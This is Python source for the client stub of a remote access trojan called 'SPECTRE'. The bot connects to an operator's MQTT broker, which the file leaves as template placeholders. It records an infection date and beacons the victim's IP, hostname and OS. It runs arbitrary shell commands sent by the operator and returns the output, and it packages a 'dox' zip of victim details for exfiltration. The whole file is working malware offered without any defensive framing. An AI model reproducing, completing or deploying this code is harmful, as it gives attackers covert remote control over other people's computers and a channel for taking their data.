# SPECTRE_Stub.py
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import socket
import platform
import ujson as json
import os
import subprocess
import zipfile
import io
from datetime import datetime
import threading
import time
from plyer import notification
from queue import Queue, Empty
from PyQt6.QtWidgets import QApplication, QDialog, QVBoxLayout, QLabel, QTextEdit, QPushButton
from PyQt6.QtCore import Qt
import sys

broker_url = '{BROKER_URL}'
broker_port = {BROKER_PORT} # type: ignore
topic = '{TOPIC}'
bot_id = '{BOT_ID}'
api_token = '{API_TOKEN}'

client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5, client_id=f"rat_bot_{bot_id}")
client.reconnect_delay_set(min_delay=1, max_delay=120)  # Enable automatic reconnection

# Track the current working directory for shell navigation
current_dir = os.getcwd()
infected_date = datetime.now().isoformat()
recording = False
cap = None
current_device_index = -1

# Flag to control the overall bot process
running = True
is_connected = False

# Queues for communication between MQTT thread and main thread (GUI)
message_queue = Queue()  # Messages from MQTT thread to main thread (GUI)
reply_queue = Queue()    # Replies from main thread (GUI) to MQTT thread

class MessageDialog(QDialog):
    def __init__(self, message, parent=None):
        super().__init__(parent)
        self.setWindowTitle("Message Received")
        self.setMinimumSize(400, 300)
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QTextEdit, QPushButton { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QLabel { 
                color: #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QVBoxLayout()
        
        # Display the received message
        message_label = QLabel(f"Received: {message}")
        layout.addWidget(message_label)
        
        # Text box for reply
        self.reply_text = QTextEdit()
        self.reply_text.setPlaceholderText("Enter your reply here...")
        layout.addWidget(self.reply_text)
        
        # Send button
        send_button = QPushButton("Send")
        send_button.clicked.connect(self.send_reply)
        layout.addWidget(send_button)
        
        # Skip button
        skip_button = QPushButton("Skip")
        skip_button.clicked.connect(self.skip_reply)
        layout.addWidget(skip_button)
        
        self.setLayout(layout)
        self.reply = ""

    def send_reply(self):
        self.reply = self.reply_text.toPlainText().strip()
        self.accept()

    def skip_reply(self):
        self.reply = ""
        self.accept()

def on_connect(client, userdata, flags, reason_code, properties=None):
    global is_connected
    if reason_code == 0:
        # Clear any retained messages on the topic
        client.publish(topic, payload=None, qos=1, retain=True)
        print(f"Bot {bot_id} cleared retained messages on topic {topic}")
        client.subscribe(topic, qos=1)
        print(f"Bot {bot_id} subscribed to topic {topic}")
        send_presence()
        print(f"Bot {bot_id} connected and subscribed to topic {topic}")
        is_connected = True
    else:
        print(f"Connection failed with code {reason_code}")
        is_connected = False

def on_disconnect(client, userdata, rc):
    global running, is_connected
    print(f"Bot {bot_id} disconnected from MQTT broker with code {rc}")
    is_connected = False
    if rc != 0 and running:
        print(f"Bot {bot_id} attempting to reconnect...")

def on_log(client, userdata, level, buf):
    print(f"Bot {bot_id} MQTT Log: {buf}")

def send_presence():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    os_info = platform.system()
    connect_msg = {
        'type': 'connect',
        'id': bot_id,
        'ip': ip,
        'os': os_info,
        'hostname': hostname
    }
    client.publish(topic, json.dumps(connect_msg), qos=1)
    print(f"Bot {bot_id} sent presence: {connect_msg}")

def execute_shell_command(command):
    try:
        global current_dir
        if command.lower() in ['dir', 'ls']:
            result = os.listdir(current_dir)
            return '\n'.join(result)
        elif command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            if new_dir:
                if os.path.isabs(new_dir):
                    new_path = new_dir
                else:
                    new_path = os.path.join(current_dir, new_dir)
                if os.path.isdir(new_path):
                    current_dir = os.path.abspath(new_path)
                    return f"Changed directory to {current_dir}"
                else:
                    return f"Directory not found: {new_path}"
            return "No directory specified"
        else:
            result = subprocess.run(command, cwd=current_dir, shell=True, capture_output=True, text=True)
            return result.stdout + result.stderr
    except Exception as e:
        return f"Error executing command: {e}"

def create_dox_zip():
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        data = {
            'ip': socket.gethostbyname(socket.gethostname()),
            'id': bot_id,
            'infected_date': infected_date
        }
        zip_file.writestr(f"dox_{bot_id}.json", json.dumps(data))
    buffer.seek(0)
    return buffer.getvalue()

def handle_message(message):
    print(f"Bot {bot_id} received message: {message}")
    ip = socket.gethostbyname(socket.gethostname())
    response = {
        'type': 'message_response',
        'id': bot_id,
        'ip': ip,
        'message': f"Bot {bot_id} received: {message}"
    }
    client.publish(topic, json.dumps(response), qos=1)
    print(f"Bot {bot_id} sent message response: {response}")
    
    # Send the message to the main thread via the message queue
    message_queue.put(message)
    
    # Wait for the reply from the main thread
    try:
        reply = reply_queue.get(timeout=30)  # Wait up to 30 seconds for a reply
        if reply:
            reply_response = {
                'type': 'message_response',
                'id': bot_id,
                'ip': ip,
                'message': reply
            }
            client.publish(topic, json.dumps(reply_response), qos=1)
            print(f"Bot {bot_id} sent message reply: {reply_response}")
    except Empty:
        print(f"Bot {bot_id} reply timeout, no reply sent")

def on_message(client, userdata, msg, properties=None):
    try:
        data = json.loads(msg.payload.decode())
        print(f"Bot {bot_id} received message: {data}")
        if data.get('type') == 'command':
            target = data['target']
            print(f"Bot {bot_id} target: {target}")
            if target == 'all':
                print(f"Bot {bot_id} processing command for 'all'")
                action = data['action']
                print(f"Bot {bot_id} action: {action}")
                process_action(action, data)
            else:
                parts = target.split(':')
                print(f"Bot {bot_id} target parts: {parts}")
                if len(parts) == 2:
                    target_ip, target_id = parts
                    ip = socket.gethostbyname(socket.gethostname())
                    print(f"Bot {bot_id} comparing: ip={ip}, target_ip={target_ip}, bot_id={bot_id}, target_id={target_id}")
                    if target_ip == ip and target_id == bot_id:
                        print(f"Bot {bot_id} target matches")
                        action = data['action']
                        print(f"Bot {bot_id} action: {action}")
                        process_action(action, data)
                    else:
                        print(f"Bot {bot_id} target does not match: ip mismatch ({ip} != {target_ip}) or id mismatch ({bot_id} != {target_id})")
                else:
                    print(f"Bot {bot_id} invalid target format: {target}")
    except Exception as e:
        print(f"Bot {bot_id} on_message error: {e}")

def process_action(action, data):
    global current_dir, recording, cap
    ip = socket.gethostbyname(socket.gethostname())
    if action == 'ping':
        print(f"Bot {bot_id} processing ping command")
        send_presence()
    elif action == 'shell':
        command = data.get('command', '')
        result = execute_shell_command(command)
        response = {
            'type': 'shell_response',
            'id': bot_id,
            'ip': ip,
            'result': result,
            'current_dir': current_dir
        }
        client.publish(topic, json.dumps(response), qos=1)
        print(f"Bot {bot_id} sent shell response: {response}")
    elif action == 'dox':
        print(f"Bot {bot_id} processing dox command")
        zip_data = create_dox_zip()
        response = {
            'type': 'dox_response',
            'id': bot_id,
            'ip': ip,
            'zip_data': zip_data.hex()
        }
        client.publish(topic, json.dumps(response), qos=1)
        print(f"Bot {bot_id} sent dox response")
    elif action == 'message':
        message = data.get('message', '')
        if platform.system() in ['Windows', 'Linux']:
            handle_message(message)
        else:
            notification.notify(
                title="Message",
                message=message,
                app_name="SPECTRE Bot",
                timeout=10
            )
            print(f"Bot {bot_id} displayed Toast notification: {message}")
            response = {
                'type': 'message_response',
                'id': bot_id,
                'ip': ip,
                'message': f"Bot {bot_id} received: {message}"
            }
            client.publish(topic, json.dumps(response), qos=1)
            print(f"Bot {bot_id} sent message response: {response}")
    elif action == 'close_message':
        print(f"Bot {bot_id} received close_message command")
        # No action needed since there's no dialog to close
    elif action == 'disconnect':
        global running
        if cap is not None:
            cap.release()
            cap = None
        client.disconnect()
        running = False  # Signal all threads to stop
        print("Bot shutting down")
        os._exit(0)

def run_mqtt_client():
    global running, is_connected
    while running:
        try:
            if not is_connected:
                if api_token:
                    client.username_pw_set(api_token)
                client.on_connect = on_connect
                client.on_message = on_message
                client.on_disconnect = on_disconnect
                client.on_log = on_log
                client.connect(broker_url, broker_port, 60)
            client.loop_forever()  # Runs until disconnected
        except KeyboardInterrupt:
            print(f"Bot {bot_id} shutting down due to keyboard interrupt")
            running = False
            client.disconnect()
            break
        except Exception as e:
            print(f"Bot {bot_id} MQTT client error: {e}")
            is_connected = False
            if not running:
                break
            time.sleep(5)  # Wait before retrying

def send_presence_periodically():
    global running
    while running:
        send_presence()
        time.sleep(15)  # Send presence every 15 seconds

if __name__ == '__main__':
    print(f"Bot {bot_id} starting up, waiting for messages...")
    
    # Start a thread to send presence messages periodically
    presence_thread = threading.Thread(target=send_presence_periodically)
    presence_thread.daemon = True
    presence_thread.start()
    
    # Start MQTT client in a separate thread
    mqtt_thread = threading.Thread(target=run_mqtt_client)
    mqtt_thread.daemon = True
    mqtt_thread.start()
    
    # Run the PyQt6 application in the main thread
    app = QApplication(sys.argv)
    while running:
        try:
            # Check for messages from the MQTT thread
            try:
                message = message_queue.get_nowait()
                dialog = MessageDialog(message)
                dialog.exec()
                reply_queue.put(dialog.reply)
            except Empty:
                pass
            # Process Qt events
            app.processEvents()
            time.sleep(0.01)  # Prevent tight loop
        except KeyboardInterrupt:
            print(f"Bot {bot_id} shutting down due to keyboard interrupt")
            running = False
            client.disconnect()
            break
        except Exception as e:
            print(f"Main thread error: {e}")
            time.sleep(1)
    app.quit()